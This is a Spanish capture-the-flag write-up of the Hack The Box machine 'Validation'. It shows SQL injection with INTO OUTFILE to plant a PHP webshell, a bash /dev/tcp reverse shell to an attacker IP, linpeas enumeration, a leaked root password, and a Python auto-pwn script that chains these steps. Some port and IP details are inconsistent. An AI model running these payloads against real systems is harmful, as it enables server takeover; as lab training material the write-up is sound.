---
title: HTB Validation
date: 2023-09-13 14:10:00 +0800
author: pablo
categories: [HTB, Linux]
tags:
  [
    SQLI (Error Based),
    SQLI -> RCE (INTO OUTFILE),
    Information Leakage,
    linpeas,
    mysql,
  ]
image:
  path: /assets/img/Validatio/Untitled.png
---

## Descripción

Validation es una máquina catalogada como fácil que cuenta con una página web vulnerable a inyecciones SQL. Para aprovechar esta vulnerabilidad, haremos uso de herramientas como BurpSuite para ejecutar la inyección SQL y cargar un archivo en el servidor, lo que nos permitirá tener ejecución de comandos. Para la escalada de privilegios, hemos decidido utilizar Linpeas, un script de bash que nos permitirá enumerar las posibles rutas para llevar a cabo la escalada.

---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo a través del script implementado en bash `whichSystem.sh`

![Untitled](/assets/img/Validatio/Untitled1.png)

El sistema operativo es una `Linux`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap.
Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn 192.168.1.20 -oG allPorts`

![Untitled](/assets/img/Validatio/Untitled2.png)

Puertos abiertos son: `22,80,4566,8080`

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.

Comando: `nmap -sCV -p80,3306,33060 192.168.1.20 -oN targeted`

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled3.png)

### Web Enumeration

Identificando tecnologías y el gestor de contenido a través de `whatweb`

![Untitled](/assets/img/Validatio/Untitled4.png)

No se lista mayor información, nos dirigimos hacia la página web

![Untitled](/assets/img/Validatio/Untitled5.png)

Tenemos un panel para ingresar un `username` y elegir un país al ingresar un usuario esta información se ve reflejada en la página web

![Untitled](/assets/img/Validatio/Untitled6.png)

Se procede a probar inyecciones HTML, SQL, XSS, etc.

- Probando inyección HTML

![Untitled](/assets/img/Validatio/Untitled7.png)

![Untitled](/assets/img/Validatio/Untitled8.png)

- Inyección SQL:

![Untitled](/assets/img/Validatio/Untitled9.png)

![Untitled](/assets/img/Validatio/Untitled10.png)

- Inyección XSS:

![Untitled](/assets/img/Validatio/Untitled11.png)

![Untitled](/assets/img/Validatio/Untitled12.png)

De las inyecciones probadas comprobamos que es vulnerable a HTML y XSS pero no listada gran información y solo son válidas en el campo `username` por lo cual a través de Burp Suite se tratara de probar inyecciones en el campo de países

### Inyección SQL con BurpSuite

Vamos a interceptar una petición y ver su estructura en el Burp Suite

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled13.png)

Disponemos de un campo `username` que es en el cual estábamos probando antes las inyecciones y un campo `country` probaremos las inyecciones en este nuevo campo.

Con:

![Untitled](/assets/img/Validatio/Untitled14.png)

Se obtiene:

![Untitled](/assets/img/Validatio/Untitled15.png)

Se comprueba que es vulnerable a inyección SQL

Se procede a identificar el número de columnas de la base de datos a través de `'order by 100`

Sé irá probando con valores muy altos y sé irá disminuyendo hasta no obtener un error y de esta manera identificar el número por el cual está conformada la base de datos.

- `'order by 10-- -` Error

![Untitled](/assets/img/Validatio/Untitled16.png)

![Untitled](/assets/img/Validatio/Untitled17.png)

- `'order by 5-- -`

![Untitled](/assets/img/Validatio/Untitled18.png)

Vamos disminuyendo los valores hasta no encontrar un error

- `'order by 1-- -`

![Untitled](/assets/img/Validatio/Untitled19.png)

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled20.png)

Por lo que podemos concluir que la base de datos esta formado por una columna, una vez identificado el numero de columnas tratamos de ver si disponemos de subir archivos a través de la query `union select` y `INTO OUTFILE`

Probaremos con la query:

```bash
' union select "Comando" into outfile '/var/www/html/prueba.txt'-- -
```

de subir un archivo `prueba.txt` que contenga la palabra comando y ver si nos muestra en el navegador.

![Untitled](/assets/img/Validatio/Untitled21.png)

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled22.png)

Por lo que comprobamos que disponemos de subida de archivos en el servidor.

## Intrusión

Una vez conocida que disponemos de la carga de archivos podemos enviar el payload para lanzar un webshell.

Utilizando la query:

```bash
' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

![Untitled](/assets/img/Validatio/Untitled23.png)

![Untitled](/assets/img/Validatio/Untitled24.png)

Disponiendo de ejecución de comandos:

![Untitled](/assets/img/Validatio/Untitled25.png)

Nos lanzaremos una consola a nuestra máquina atacante que estará en escucha a través de netcat

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.14.7/443 0>%261"
```

![Untitled](/assets/img/Validatio/Untitled26.png)

![Untitled](/assets/img/Validatio/Untitled27.png)

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled28.png)

Disponemos de una consola interactiva correspondiente a la máquina víctima

Listando la flag `user.txt`

![Untitled](/assets/img/Validatio/Untitled29.png)

## Privilege Escalation

Para esta la parte de escalada yo decidí probar el uso de `Linpeas` que como nos dice la descripción de su Github “**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on”**

### Linpeas

Procedemos a descargarnos el script de la página https://github.com/carlospolop/PEASS-ng/releases/tag/20230305

Al ser una máquina Linux corresponde el `.sh`

La máquina víctima no cuenta con un editor de texto, por lo que en mi máquina de atacante codificaré el script en Base64 y lo copiaré en mi portapapeles. De esta forma, podré decodificar el código en la máquina víctima y guardarlo en un archivo.

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled30.png)

Tendremos el script codificado en base64 guardado en nuestra clipbord, procedemos a pegar este contenido en la maquina victima y guardalo, tendremos que irnos a un directorio con capacidad de escritura y ejectucion como puede ser `/tmp/`

Recordar que el comando a utilizar para la decodificación es

```bash
echo <contenido clipboard> | base64 -d > linpeas.sh
```

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled31.png)

Otorgamos de permisos de ejecución y procedemos a ejecutar el script:

![Untitled](/assets/img/Validatio/Untitled32.png)

Obteniendo:

![Untitled](/assets/img/Validatio/Untitled33.png)

Como habrás notado, hay una gran cantidad de información disponible. No te abrumes y tómate un tiempo para revisar cuidadosamente todos los apartados de información que la herramienta nos ha proporcionado. Con paciencia, podrás procesar toda la información de manera efectiva.

En la sección de “Interesting Files”

![Untitled](/assets/img/Validatio/Untitled34.png)

En la subsección “Searching passwords in config PHP files”

![Untitled](/assets/img/Validatio/Untitled35.png)

Nos está listando una contraseña:

- `uhc-9qual-global-pw`

La probamos con el usuario root

![Untitled](/assets/img/Validatio/Untitled36.png)

Se habrá ganado acceso al usuario root. Esta contraseña se encuentra en el directorio `/var/ww/html` y fácilmente hubiera sido listada con el usuario www-data.

Listando flag: `root.txt`

![Untitled](/assets/img/Validatio/Untitled37.png)

Es evidente que "Linpeas" es una herramienta muy útil para la escalada de privilegios, ya que nos ayuda a recopilar una gran cantidad de información útil. Si bien puede no ser tan relevante en máquinas sencillas como esta, puede resultar muy valiosa en máquinas más complejas. En definitiva, "Linpeas" es una opción interesante que deberíamos considerar para futuras escaladas de privilegios, ya que también funciona en Windows.

## Script Python Auto Pwn

```python
##!/usr/bin/python3

from pwn import *
import signal, pdb, requests
import sys
import threading  # Agregar la importación de threading

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

## Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3:
    log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
    sys.exit(1)

## Variables Globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 555

def createFile():
    data_post = {
        'username': 'pablo',
        'country': """Brazil' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -""" % filename
    }

    r = requests.post(main_url, data=data_post)

def getAccess():
    data_post = {
        'cmd' : "bash -c 'bash -i >& /dev/tcp/10.10.14.9/555 0>&1'"
    }

    r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':
    createFile()
    try:
        threading.Thread(target=getAccess, args=()).start()
##        pdb.set_trace()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.sendline("su root")
    time.sleep(2)
    shell.sendline("uhc-9qual-global-pw")
    shell.interactive()
```
